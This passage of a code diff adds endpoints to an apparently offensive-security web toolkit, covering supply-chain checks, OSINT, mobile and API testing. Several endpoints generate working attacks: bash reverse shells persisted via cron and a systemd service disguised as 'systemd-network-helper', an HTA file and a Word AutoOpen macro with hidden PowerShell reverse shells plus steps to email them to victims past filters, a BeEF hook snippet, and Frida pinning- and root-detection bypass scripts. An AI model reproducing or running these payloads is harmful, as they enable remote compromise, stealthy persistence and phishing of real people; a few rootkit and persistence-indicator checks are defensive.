+                sev = v.get("severity", "MEDIUM").upper() if isinstance(v, dict) else "MEDIUM"
+                findings.append({"severity": sev, "title": "Vulnerability", "detail": str(v)[:200]})
+    except Exception:
+        for line in raw.splitlines():
+            if "critical" in line.lower() or "high" in line.lower():
+                findings.append({"severity": "HIGH", "title": "Audit Finding", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Audit complete", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": path, "findings": findings, "raw_output": raw[:2000],
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} vuln(s) found"}
+
+
+@app.post("/api/supply/confusion")
+async def supply_confusion(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    packages = opts.get("packages", [req.target])
+    findings = []
+    raw_parts = []
+    for pkg in packages:
+        result = await run_tool(
+            ["pip", "download", pkg, "--no-deps", "-d", "/tmp/pkgcheck"],
+            timeout=30
+        )
+        raw = result["output"] + result.get("error","")
+        raw_parts.append(f"[{pkg}]\n{raw}")
+        if "successfully downloaded" in raw.lower() or "saved" in raw.lower():
+            findings.append({"severity": "HIGH", "title": f"Package Downloadable: {pkg}",
+                             "detail": "Package exists on PyPI — potential confusion risk if internal"})
+        elif "no matching" in raw.lower() or "not found" in raw.lower():
+            findings.append({"severity": "INFO", "title": f"Package Not Found: {pkg}",
+                             "detail": "Not on PyPI — safe from public confusion"})
+        else:
+            findings.append({"severity": "MEDIUM", "title": f"Check Result: {pkg}", "detail": raw[:200]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(packages)} package(s) checked"}
+
+
+@app.post("/api/supply/sbom")
+async def supply_sbom(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    scan_path = opts.get("path", req.target)
+    manifest_files = ["package.json", "requirements.txt", "Gemfile", "go.mod", "pom.xml",
+                      "Cargo.toml", "composer.json", "yarn.lock"]
+    findings = []
+    raw_parts = []
+    for mf in manifest_files:
+        full = os.path.join(scan_path, mf)
+        if os.path.exists(full):
+            try:
+                with open(full, "r", errors="ignore") as f:
+                    content = f.read(2000)
+                raw_parts.append(f"=== {mf} ===\n{content}")
+                dep_count = content.count("\n")
+                findings.append({"severity": "INFO", "title": f"Manifest: {mf}",
+                                 "detail": f"Found at {full} (~{dep_count} lines)"})
+                if "lodash" in content.lower() or "log4j" in content.lower():
+                    findings.append({"severity": "HIGH", "title": f"Known Risky Dep in {mf}",
+                                     "detail": "lodash/log4j detected — verify version"})
+            except Exception as e:
+                findings.append({"severity": "INFO", "title": f"Could not read {mf}", "detail": str(e)})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No manifest files found", "detail": f"Scanned: {scan_path}"})
+    return {"scan_id": scan_id, "target": scan_path, "findings": findings, "raw_output": "\n".join(raw_parts)[:3000],
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} SBOM entry(ies)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# ADVANCED PERSISTENCE
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/persist/install_cron")
+async def persist_install_cron(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 4444)
+    interval = opts.get("interval", "*/5 * * * *")
+    shell_cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    cron_line = f"{interval} root {shell_cmd}"
+    payload_path = "/tmp/cron_payload"
+    payload = f"# Cron persistence payload (review before use)\n# Add to /etc/crontab:\n{cron_line}\n"
+    try:
+        with open(payload_path, "w") as f:
+            f.write(payload)
+        written = True
+    except Exception:
+        written = False
+    install_cmd = f"echo '{cron_line}' >> /etc/crontab"
+    findings = [
+        {"severity": "CRITICAL", "title": "Cron Payload (NOT installed)", "detail": cron_line},
+        {"severity": "HIGH", "title": "Install Command (manual)", "detail": install_cmd},
+        {"severity": "INFO", "title": "Payload Written To", "detail": payload_path if written else "Write failed"},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": payload,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Cron payload generated (not installed)"}
+
+
+@app.post("/api/persist/install_service")
+async def persist_install_service(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", "10.10.10.10")
+    lport = opts.get("lport", 4444)
+    svc_name = "systemd-network-helper"
+    svc_content = (
+        f"[Unit]\nDescription=Network Helper Service\nAfter=network.target\n\n"
+        f"[Service]\nType=simple\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\n"
+        f"Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n"
+    )
+    install_cmds = (
+        f"cp {svc_name}.service /etc/systemd/system/\n"
+        f"systemctl daemon-reload\n"
+        f"systemctl enable {svc_name}\n"
+        f"systemctl start {svc_name}"
+    )
+    findings = [
+        {"severity": "CRITICAL", "title": "Systemd Service File", "detail": svc_content},
+        {"severity": "HIGH", "title": "Install Commands", "detail": install_cmds},
+        {"severity": "INFO", "title": "Service Name", "detail": svc_name},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings,
+            "raw_output": svc_content + "\n" + install_cmds,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Systemd persistence service generated"}
+
+
+@app.post("/api/persist/rootkit_scan")
+async def persist_rootkit_scan(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    r1 = await run_tool(
+        ["sh", "-c", "rkhunter --check --skip-keypress 2>/dev/null | tail -50"],
+        timeout=120
+    )
+    r2 = await run_tool(
+        ["sh", "-c", "chkrootkit 2>/dev/null | grep -i INFECTED"],
+        timeout=60
+    )
+    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
+    findings = []
+    for line in raw.splitlines():
+        ll = line.lower()
+        if "infected" in ll or "warning" in ll:
+            findings.append({"severity": "CRITICAL", "title": "Rootkit Indicator", "detail": line.strip()})
+        elif "not found" in ll and "rkhunter" not in ll:
+            findings.append({"severity": "MEDIUM", "title": "Suspicious File Missing", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No rootkit indicators", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} rootkit indicator(s)"}
+
+
+@app.post("/api/persist/check_indicators")
+async def persist_check_indicators(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    cmd = (
+        "crontab -l 2>/dev/null; "
+        "find /etc/systemd/system -newer /tmp -name '*.service' 2>/dev/null; "
+        "grep -v '^#' ~/.bashrc 2>/dev/null | grep -v '^$'; "
+        "grep -v '^#' ~/.profile 2>/dev/null | grep -v '^$'; "
+        "cat /etc/rc.local 2>/dev/null; "
+        "find / -perm -4000 -newer /etc/passwd -type f 2>/dev/null; "
+        "awk -F: '$3==0{print $1}' /etc/passwd; "
+        "cat ~/.ssh/authorized_keys 2>/dev/null"
+    )
+    result = await run_tool(["sh", "-c", cmd], timeout=30)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        ll = line.strip().lower()
+        if not ll:
+            continue
+        if "ssh-rsa" in ll or "ssh-ed25519" in ll or "authorized_keys" in ll:
+            findings.append({"severity": "CRITICAL", "title": "SSH Authorized Key", "detail": line.strip()})
+        elif ".service" in ll:
+            findings.append({"severity": "HIGH", "title": "New Systemd Service (last 7d)", "detail": line.strip()})
+        elif re.search(r'\*.*\*', ll):
+            findings.append({"severity": "HIGH", "title": "Cron Entry", "detail": line.strip()})
+        elif "export" in ll or "alias" in ll or "curl" in ll or "wget" in ll:
+            findings.append({"severity": "MEDIUM", "title": "Suspicious Shell Config", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No persistence indicators", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} persistence IoC(s)"}
+
+
+# ─────────────────────────────────────────────────────────────
+# OSINT
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/osint/spiderfoot")
+async def osint_spiderfoot(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["spiderfoot", "-s", req.target,
+         "-m", "sfp_dnsresolve,sfp_whois,sfp_shodan,sfp_portscan_tcp",
+         "-o", "csv", "-q"],
+        timeout=120
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    if "not found" in raw.lower() or "no such file" in raw.lower():
+        findings.append({"severity": "INFO", "title": "SpiderFoot Not Found",
+                         "detail": "Launch SpiderFoot web UI: spiderfoot -l 127.0.0.1:5001"})
+    else:
+        for line in raw.splitlines():
+            if "," in line and len(line) > 20:
+                parts = line.split(",", 2)
+                findings.append({"severity": "INFO", "title": f"OSINT: {parts[0].strip()}",
+                                 "detail": parts[-1].strip()[:200]})
+            if len(findings) >= 40:
+                break
+    if not findings:
+        findings.append({"severity": "INFO", "title": "SpiderFoot output", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} OSINT record(s)"}
+
+
+@app.post("/api/osint/recon_ng")
+async def osint_recon_ng(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["recon-cli", "-w", "oscp_ws",
+         "-m", "recon/domains-hosts/google_site_web",
+         "-o", f"SOURCE={req.target}", "-x"],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if re.search(r'\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b', line.lower()):
+            host = re.search(r'\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b', line.lower()).group()
+            if req.target.split("/")[-1] in host:
+                findings.append({"severity": "MEDIUM", "title": "Host Discovered", "detail": host})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Recon-ng output", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} host(s) found"}
+
+
+@app.post("/api/osint/email_osint")
+async def osint_email_osint(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["theHarvester", "-d", req.target, "-b", "google,bing,linkedin,hunter", "-l", "100"],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        if re.match(r'^[\w\.-]+@[\w\.-]+\.\w+$', line.strip()):
+            findings.append({"severity": "MEDIUM", "title": "Email Found", "detail": line.strip()})
+        elif "linkedin.com/in/" in line.lower():
+            findings.append({"severity": "INFO", "title": "LinkedIn Profile", "detail": line.strip()})
+        elif re.match(r'^\d{1,3}(\.\d{1,3}){3}$', line.strip()):
+            findings.append({"severity": "INFO", "title": "IP Found", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "theHarvester output", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} OSINT item(s)"}
+
+
+@app.post("/api/osint/maltego")
+async def osint_maltego(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    instructions = (
+        "# Maltego CE Setup:\n"
+        "1. Install: apt-get install maltego\n"
+        "2. Launch: maltego\n"
+        "3. Register free CE account at maltego.com\n"
+        f"4. New Graph -> Add Entity -> Domain -> Set value: {req.target}\n"
+        "5. Right-click entity -> Run Transforms -> All Transforms\n"
+        "   Recommended transforms:\n"
+        "   - To DNS Name [Using DNS]\n"
+        "   - To IP Address [DNS]\n"
+        "   - To Email Address [PGP]\n"
+        "   - To MX Record [DNS]\n"
+        "   - To Website [DNS]\n"
+        "6. Export: Maltego Graph -> Export as CSV/XLSX\n"
+    )
+    cli_transforms = [
+        f"maltego-trx -d {req.target} -t DNS",
+        f"maltego-trx -d {req.target} -t WHOIS",
+        f"maltego-trx -d {req.target} -t Email",
+    ]
+    findings = [
+        {"severity": "INFO", "title": "Maltego Setup Instructions", "detail": instructions},
+    ]
+    for cmd in cli_transforms:
+        findings.append({"severity": "INFO", "title": "Transform Command", "detail": cmd})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": instructions,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "Maltego instructions generated"}
+
+
+# ─────────────────────────────────────────────────────────────
+# CLIENT-SIDE ATTACKS
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/client/beef")
+async def client_beef(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    r_check = await run_tool(["sh", "-c", "ps aux | grep beef | grep -v grep"], timeout=10)
+    beef_running = bool(r_check["output"].strip())
+    if not beef_running:
+        await run_tool(["sh", "-c", "beef-xss &"], timeout=5)
+    lhost = (req.options or {}).get("lhost", req.target)
+    hook_url = f"http://{lhost}:3000/hook.js"
+    js_snippet = f'<script src="{hook_url}"></script>'
+    ui_url = f"http://127.0.0.1:3000/ui/panel"
+    findings = [
+        {"severity": "HIGH" if beef_running else "MEDIUM",
+         "title": "BeEF Status",
+         "detail": "BeEF is RUNNING" if beef_running else "BeEF started (may take a moment)"},
+        {"severity": "HIGH", "title": "Hook URL", "detail": hook_url},
+        {"severity": "INFO", "title": "JS Inject Snippet", "detail": js_snippet},
+        {"severity": "INFO", "title": "UI Panel", "detail": ui_url},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings,
+            "raw_output": f"hook_url={hook_url}\njs={js_snippet}\nui={ui_url}",
+            "timestamp": datetime.datetime.utcnow().isoformat(),
+            "message": "BeEF running" if beef_running else "BeEF started"}
+
+
+@app.post("/api/client/hta_payload")
+async def client_hta_payload(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", req.target)
+    lport = opts.get("lport", 4444)
+    hta_content = (
+        f'<html>\n<head>\n<script language="VBScript">\n'
+        f'Sub Main()\n'
+        f'    Dim shell\n'
+        f'    Set shell = CreateObject("WScript.Shell")\n'
+        f'    shell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -c '
+        f'$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});'
+        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
+        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
+        f'$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}", 0\n'
+        f'    self.close\n'
+        f'End Sub\n'
+        f'Main\n'
+        f'</script>\n</head>\n<body></body>\n</html>\n'
+    )
+    delivery = (
+        f"# Save as payload.hta and host:\n"
+        f"python3 -m http.server 80\n"
+        f"# Deliver URL to victim: http://{lhost}/payload.hta\n"
+        f"# Listener: nc -lvnp {lport}"
+    )
+    findings = [
+        {"severity": "CRITICAL", "title": "HTA Payload", "detail": hta_content[:400]},
+        {"severity": "HIGH", "title": "Delivery Instructions", "detail": delivery},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": hta_content,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "HTA payload generated"}
+
+
+@app.post("/api/client/macro")
+async def client_macro(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    lhost = opts.get("lhost", req.target)
+    lport = opts.get("lport", 4444)
+    vba_code = (
+        f'Sub AutoOpen()\n'
+        f'    Dim cmd As String\n'
+        f'    cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -c '
+        f'$c=New-Object System.Net.Sockets.TCPClient(""{lhost}"",{lport});'
+        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
+        f'while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
+        f'$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}"\n'
+        f'    Shell "cmd /c " & cmd, vbHide\n'
+        f'End Sub\n\n'
+        f'Sub Document_Open()\n'
+        f'    AutoOpen\n'
+        f'End Sub\n'
+    )
+    instructions = (
+        "1. Open Word -> View -> Macros -> Create macro named 'AutoOpen'\n"
+        "2. Paste VBA code above\n"
+        "3. Save as .docm (Macro-Enabled Document)\n"
+        "4. Send to victim via email (zip to bypass email filters)\n"
+        f"5. Start listener: nc -lvnp {lport}"
+    )
+    findings = [
+        {"severity": "CRITICAL", "title": "VBA Macro Payload", "detail": vba_code[:400]},
+        {"severity": "HIGH", "title": "Embedding Instructions", "detail": instructions},
+    ]
+    return {"scan_id": scan_id, "target": lhost, "findings": findings, "raw_output": vba_code,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": "VBA macro generated"}
+
+
+# ─────────────────────────────────────────────────────────────
+# MOBILE TESTING
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/mobile/apk_info")
+async def mobile_apk_info(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    apk_path = opts.get("apk_path", req.target)
+    out_dir = f"/tmp/apk_out_{scan_id[:8]}"
+    r1 = await run_tool(["aapt", "dump", "badging", apk_path], timeout=30)
+    r2 = await run_tool(["apktool", "d", apk_path, "-o", out_dir, "-f"], timeout=60)
+    raw = r1["output"] + r1["error"] + "\n" + r2["output"] + r2["error"]
+    findings = []
+    for line in r1["output"].splitlines():
+        if line.startswith("package:"):
+            findings.append({"severity": "INFO", "title": "Package Info", "detail": line.strip()})
+        elif "uses-permission" in line.lower():
+            perm = re.search(r"name='([^']+)'", line)
+            perm_name = perm.group(1) if perm else line.strip()
+            dangerous = any(d in perm_name for d in ["CAMERA", "MICROPHONE", "CONTACTS", "LOCATION",
+                                                       "READ_SMS", "RECORD_AUDIO", "CALL_PHONE"])
+            sev = "HIGH" if dangerous else "INFO"
+            findings.append({"severity": sev, "title": "Permission", "detail": perm_name})
+        elif "activity" in line.lower():
+            findings.append({"severity": "INFO", "title": "Activity", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "APK Info", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} APK finding(s)"}
+
+
+@app.post("/api/mobile/decompile")
+async def mobile_decompile(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    apk_path = opts.get("apk_path", req.target)
+    out_dir = f"/tmp/jadx_{scan_id[:8]}"
+    result = await run_tool(["jadx", "-d", out_dir, apk_path], timeout=120)
+    raw = result["output"] + result.get("error","")
+    findings = []
+    if os.path.isdir(out_dir):
+        java_files = []
+        for root, dirs, files in os.walk(out_dir):
+            for f in files:
+                if f.endswith(".java"):
+                    java_files.append(os.path.join(root, f))
+        findings.append({"severity": "INFO", "title": "Decompile Successful",
+                         "detail": f"{len(java_files)} Java file(s) at {out_dir}"})
+        for jf in java_files[:10]:
+            findings.append({"severity": "INFO", "title": "Decompiled File", "detail": jf})
+    else:
+        findings.append({"severity": "MEDIUM", "title": "Decompile Failed/Partial", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Output at {out_dir}"}
+
+
+@app.post("/api/mobile/permissions")
+async def mobile_permissions(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    apk_path = opts.get("apk_path", req.target)
+    manifest_paths = [
+        os.path.join(apk_path, "AndroidManifest.xml"),
+        "/tmp/apk_out/AndroidManifest.xml",
+    ]
+    dangerous = {"CAMERA", "RECORD_AUDIO", "READ_CONTACTS", "ACCESS_FINE_LOCATION",
+                 "ACCESS_COARSE_LOCATION", "READ_SMS", "SEND_SMS", "READ_CALL_LOG",
+                 "WRITE_CONTACTS", "GET_ACCOUNTS", "USE_BIOMETRIC"}
+    findings = []
+    raw = ""
+    for mp in manifest_paths:
+        if os.path.exists(mp):
+            with open(mp, "r", errors="ignore") as f:
+                raw = f.read()
+            perms = re.findall(r'android\.permission\.([A-Z_]+)', raw)
+            for perm in perms:
+                sev = "CRITICAL" if perm in dangerous else "INFO"
+                findings.append({"severity": sev, "title": f"Permission: {perm}",
+                                 "detail": f"android.permission.{perm}"})
+            break
+    if not findings:
+        result = await run_tool(["aapt", "dump", "permissions", apk_path], timeout=15)
+        raw = result["output"] + result.get("error","")
+        for line in raw.splitlines():
+            perm_m = re.search(r'android\.permission\.([A-Z_]+)', line)
+            if perm_m:
+                perm = perm_m.group(1)
+                sev = "CRITICAL" if perm in dangerous else "INFO"
+                findings.append({"severity": sev, "title": f"Permission: {perm}", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No permissions found", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": apk_path, "findings": findings, "raw_output": raw[:2000],
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} permission(s)"}
+
+
+@app.post("/api/mobile/frida_script")
+async def mobile_frida_script(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    pkg = opts.get("package_name", req.target)
+    bypass_type = opts.get("bypass_type", "ssl")
+    scripts = {
+        "ssl": (
+            "// Frida SSL Pinning Bypass\n"
+            "Java.perform(function() {\n"
+            "    var CertPinner = Java.use('okhttp3.CertificatePinner');\n"
+            "    CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(a, b) {\n"
+            "        console.log('[+] SSL Pinning bypassed for: ' + a);\n"
+            "    };\n"
+            "    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
+            "    TrustManager.checkServerTrusted.implementation = function() {};\n"
+            "});\n"
+        ),
+        "root": (
+            "// Frida Root Detection Bypass\n"
+            "Java.perform(function() {\n"
+            "    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');\n"
+            "    RootBeer.isRooted.implementation = function() { return false; };\n"
+            "    var System = Java.use('java.lang.System');\n"
+            "    var Runtime = Java.use('java.lang.Runtime');\n"
+            "    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {\n"
+            "        if (cmd.indexOf('su') !== -1) return null;\n"
+            "        return this.exec(cmd);\n"
+            "    };\n"
+            "});\n"
+        ),
+        "cert": (
+            "// Frida Certificate Pinning Bypass (Android < 7)\n"
+            "Java.perform(function() {\n"
+            "    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');\n"
+            "    var SSLContext = Java.use('javax.net.ssl.SSLContext');\n"
+            "    var TrustManager = Java.registerClass({\n"
+            "        name: 'bypass.TrustManager',\n"
+            "        implements: [X509TrustManager],\n"
+            "        methods: {\n"
+            "            checkClientTrusted: function() {},\n"
+            "            checkServerTrusted: function() {},\n"
+            "            getAcceptedIssuers: function() { return []; }\n"
+            "        }\n"
+            "    });\n"
+            "    var ctx = SSLContext.getInstance('TLS');\n"
+            "    ctx.init(null, [TrustManager.$new()], null);\n"
+            "    SSLContext.getDefault.implementation = function() { return ctx; };\n"
+            "});\n"
+        ),
+    }
+    script = scripts.get(bypass_type, scripts["ssl"])
+    run_cmd = f"frida -U -f {pkg} -l bypass_{bypass_type}.js --no-pause"
+    findings = [
+        {"severity": "HIGH", "title": f"Frida {bypass_type.upper()} Bypass Script", "detail": script[:400]},
+        {"severity": "INFO", "title": "Run Command", "detail": run_cmd},
+        {"severity": "INFO", "title": "Note", "detail": "Requires frida-server running on device and USB debugging enabled"},
+    ]
+    return {"scan_id": scan_id, "target": pkg, "findings": findings, "raw_output": script,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"Frida {bypass_type} bypass script generated"}
+
+
+# ─────────────────────────────────────────────────────────────
+# API SECURITY
+# ─────────────────────────────────────────────────────────────
+
+@app.post("/api/apisec/fuzz")
+async def apisec_fuzz(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    result = await run_tool(
+        ["ffuf", "-u", f"{req.target}/FUZZ",
+         "-w", "/usr/share/wordlists/dirb/common.txt",
+         "-mc", "200,301,302,401,403",
+         "-H", "Content-Type: application/json",
+         "-t", "50"],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    for line in raw.splitlines():
+        m = re.search(r'(\S+)\s+\[Status: (\d+)', line)
+        if m:
+            endpoint, status = m.group(1), m.group(2)
+            sev = "HIGH" if status in ("200", "301") else "MEDIUM"
+            findings.append({"severity": sev, "title": f"Endpoint Found: /{endpoint}",
+                             "detail": f"Status: {status}"})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "ffuf output", "detail": raw[:400]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} endpoint(s) found"}
+
+
+@app.post("/api/apisec/swagger")
+async def apisec_swagger(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    paths_to_try = ["/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs", "/swagger/v1/swagger.json"]
+    findings = []
+    raw_parts = []
+    for path in paths_to_try:
+        url = req.target.rstrip("/") + path
+        result = await run_tool(["curl", "-sk", "--max-time", "10", url], timeout=15)
+        raw_parts.append(f"[{url}]\n{result['output'][:200]}")
+        if result["output"] and len(result["output"]) > 50:
+            try:
+                data = json.loads(result["output"])
+                endpoints = list(data.get("paths", {}).keys())
+                findings.append({"severity": "HIGH", "title": f"Swagger/OpenAPI Found: {path}",
+                                 "detail": f"{len(endpoints)} endpoint(s): {', '.join(endpoints[:5])}"})
+                for ep, methods in data.get("paths", {}).items():
+                    for method in methods.keys():
+                        findings.append({"severity": "MEDIUM", "title": f"{method.upper()} {ep}",
+                                         "detail": str(methods[method].get("summary", ""))[:100]})
+                    if len(findings) > 30:
+                        break
+                break
+            except Exception:
+                findings.append({"severity": "INFO", "title": f"Response at {path}", "detail": result["output"][:200]})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "No Swagger/OpenAPI found", "detail": str(paths_to_try)})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": "\n".join(raw_parts),
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} API spec finding(s)"}
+
+
+@app.post("/api/apisec/arjun")
+async def apisec_arjun(req: ScanRequest, token: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    out_file = f"/tmp/arjun_{scan_id[:8]}.json"
+    result = await run_tool(
+        ["arjun", "-u", req.target, "--stable", "-oJ", out_file],
+        timeout=60
+    )
+    raw = result["output"] + result.get("error","")
+    findings = []
+    if os.path.exists(out_file):
+        try:
+            with open(out_file) as f:
+                data = json.load(f)
+            for endpoint, params in (data.items() if isinstance(data, dict) else []):
+                for param in (params if isinstance(params, list) else []):
+                    findings.append({"severity": "MEDIUM", "title": f"Parameter Found: {param}",
+                                     "detail": f"Endpoint: {endpoint}"})
+        except Exception:
+            pass
+    for line in raw.splitlines():
+        if "parameter" in line.lower() or "found" in line.lower():
+            findings.append({"severity": "MEDIUM", "title": "Arjun Finding", "detail": line.strip()})
+    if not findings:
+        findings.append({"severity": "INFO", "title": "Arjun output", "detail": raw[:300]})
+    return {"scan_id": scan_id, "target": req.target, "findings": findings, "raw_output": raw,
+            "timestamp": datetime.datetime.utcnow().isoformat(), "message": f"{len(findings)} parameter(s) found"}
+
+
+@app.post("/api/apisec/auth_test")
+async def apisec_auth_test(req: ScanRequest, token_dep: str = Depends(verify_token)):
+    scan_id = str(_uuid.uuid4())
+    opts = req.options or {}
+    token_val = opts.get("token", "")
+    endpoints = opts.get("endpoints", [req.target])
+    findings = []
+    raw_parts = []
+    for ep in endpoints[:10]:
+        r_no_auth = await run_tool(["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}", ep], timeout=10)
+        code_no_auth = r_no_auth["output"].strip()
+        raw_parts.append(f"No-auth {ep}: {code_no_auth}")
+        if code_no_auth in ("200", "201"):
+            findings.append({"severity": "CRITICAL", "title": "Endpoint Accessible Without Auth",
+                             "detail": f"{ep} returned {code_no_auth}"})
+        if token_val:
+            tampered = token_val[:-4] + "XXXX" if len(token_val) > 4 else token_val + "bad"
+            r_tampered = await run_tool(
+                ["curl", "-sk", "-o", "/dev/null", "-w", "%{http_code}",
+                 "-H", f"Authorization: Bearer {tampered}", ep],
+                timeout=10
+            )
+            code_tampered = r_tampered["output"].strip()
+            raw_parts.append(f"Tampered JWT {ep}: {code_tampered}")
+            if code_tampered in ("200", "201"):
+                findings.append({"severity": "CRITICAL", "title": "Accepts Tampered JWT",
+                                 "detail": f"{ep} returned {code_tampered} with invalid token"})
+            else:
+                findings.append({"severity": "INFO", "title": "Tampered JWT Rejected",
